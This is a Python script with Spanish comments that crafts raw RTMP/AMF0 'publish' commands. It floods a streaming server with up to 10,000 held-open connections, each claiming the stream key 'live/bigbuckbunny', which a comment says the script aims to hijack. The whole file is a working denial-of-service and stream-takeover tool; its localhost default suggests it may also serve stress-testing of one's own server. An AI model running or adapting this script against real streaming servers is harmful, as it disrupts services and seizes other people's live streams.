import socket
import time

# --- Configuración ---
SERVER_IP = "127.0.0.1"
SERVER_PORT = 1935
# Este es el stream ID que vamos a secuestrar
STREAM_KEY = "live/bigbuckbunny"

def create_amf_string(s):
    """Crea una cadena en formato AMF0."""
    s_bytes = s.encode('utf-8')
    return b'\x02' + len(s_bytes).to_bytes(2, 'big') + s_bytes

def create_amf_number(n):
    """Crea un número en formato AMF0."""
    import struct
    return b'\x00' + struct.pack('>d', n)

def send_rtmp_command(sock, command_name, transaction_id, stream_key):
    """Envía un comando RTMP simple como 'publish'."""
    # Comando 'publish'
    command = create_amf_string(command_name)
    # ID de transacción
    trans_id = create_amf_number(transaction_id)
    # Objeto de comando nulo
    command_obj = b'\x05' # null
    # Stream Key (nombre de la publicación)
    publishing_name = create_amf_string(stream_key)
    # Tipo de publicación ('live')
    publishing_type = create_amf_string('live')

    # Unimos el payload AMF0
    payload = command + trans_id + command_obj + publishing_name + publishing_type

    # Creamos el header del mensaje RTMP
    # csid=3, fmt=0
    header = b'\x03'
    # timestamp (0)
    header += b'\x00\x00\x00'
    # body size
    header += len(payload).to_bytes(3, 'big')
    # type id (0x14 = AMF0 command)
    header += b'\x14'
    # stream id (1)
    header += b'\x01\x00\x00\x00'

    packet = header + payload
    # No imprimimos en cada envío para no saturar la consola
    # print(f"Enviando comando '{command_name}' para el stream '{stream_key}'...")
    sock.sendall(packet)

def main():
    import sys, os

    # --- Ajuste de ulimit al inicio ---
    # Intentamos aumentar el límite de archivos abiertos antes de empezar
    if sys.platform.startswith('linux') or sys.platform == 'darwin':
        try:
            import resource
            soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
            
            # Establecemos un objetivo deseado para el límite
            num_conns_target = 10000 + 50 # Conexiones + un margen para otros archivos
            
            if soft < num_conns_target:
                try:
                    # Intentamos ajustar el límite, sin superar el límite máximo (hard)
                    new_limit = min(num_conns_target, hard)
                    resource.setrlimit(resource.RLIMIT_NOFILE, (new_limit, hard))
                    print(f"Límite de archivos abiertos ajustado a {new_limit}.")
                except ValueError:
                    print(f"[ADVERTENCIA] No se pudo aumentar el límite de archivos abiertos a {num_conns_target}.")
                    print(f"Ejecuta el script con 'sudo' o aumenta el límite manualmente: ulimit -n {num_conns_target}")
        except (ImportError, ValueError):
            # Si el módulo resource no está disponible o falla, solo informamos.
            print("[INFO] No se pudo ajustar automáticamente el límite de archivos abiertos.")


    print("\nEste script abrirá muchas conexiones, enviará un comando 'publish' en cada una y no las cerrará.\n")
    num_conns = 10000  # Puedes ajustar este número según la capacidad de tu máquina
    conexiones = []
    
    for i in range(num_conns):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((SERVER_IP, SERVER_PORT))
            # Para cada conexión, enviamos el comando 'publish'
            send_rtmp_command(s, "publish", i + 1, STREAM_KEY)
            conexiones.append(s)
            print(f"Conexión {i+1}/{num_conns} abierta y comando enviado.")
        except OSError as e:
            print(f"Error al abrir la conexión {i+1}: {e}")
            if e.errno == 24:  # Too many open files
                print("\n[ADVERTENCIA] Has alcanzado el límite de archivos abiertos (ulimit -n).\n")
                print("El ajuste automático al inicio no fue suficiente o falló.")
                print("Asegúrate de tener los permisos necesarios (ejecutar con sudo) o aumenta el límite manualmente.")
                break
            else:
                break
        except Exception as e:
            print(f"Error en la conexión {i+1}: {e}")
            # Continuamos con la siguiente conexión si hay un error de envío
            continue

    print(f"\nTotal de conexiones abiertas: {len(conexiones)}")
    print("Las conexiones permanecerán abiertas. Presiona Ctrl+C para finalizar y liberar recursos.")
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("\nCerrando conexiones...")
        for s in conexiones:
            try:
                s.close()
            except Exception:
                pass
        print("Conexiones cerradas. Salida del script.")

if __name__ == "__main__":
    main()
